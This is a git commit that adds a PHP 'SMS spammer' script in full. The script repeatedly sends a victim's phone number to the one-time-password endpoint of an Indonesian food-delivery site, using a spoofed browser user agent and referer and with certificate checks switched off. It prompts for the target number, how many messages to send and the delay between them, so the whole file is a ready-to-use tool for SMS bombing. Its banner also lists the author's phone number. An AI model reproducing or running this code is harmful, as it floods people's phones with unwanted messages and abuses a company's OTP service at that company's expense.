5fd21fdc3c5cc10d525673478a2cecfb3e7c32a2
V1O7ET <55115160+V1O7ET@users.noreply.github.com>
2019-09-16 14:30:26 +0700

    Add files via upload

---
+++ phd.php
@@ -0,0 +1,40 @@
+<?php
+/* 
+SPAMMER SMS PHD
+Script By : V1O7EY
+*/
+@ini_set('output_buffering',0);
+function phd($no, $jum, $wait){
+    $x = 0; 
+    while($x < $jum) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL,"https://www.phd.co.id/en/users/sendOTP");
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone_number=".$no);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($ch, CURLOPT_REFERER, 'https://www.phd.co.id/en/users/createnewuser');
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+        $server_output = curl_exec ($ch);
+        curl_close ($ch);
+		echo $server_output."\n";
+        sleep($wait);
+        $x++;
+        flush();
+    }
+}
+echo "
+    Spamer By : V1O7ET                
+    Code By : V1O7ET     
+    Contact Me : 085730882379                                             \n\n";
+echo "Nomor Target : ";
+$nomor = trim(fgets(STDIN));
+echo "Jumlah Sms : ";
+$jumlah = trim(fgets(STDIN));
+echo "Jeda Waktu : ";
+$jeda = trim(fgets(STDIN));
+$execute = phd($nomor, $jumlah, $jeda);
+print $execute;
+?>
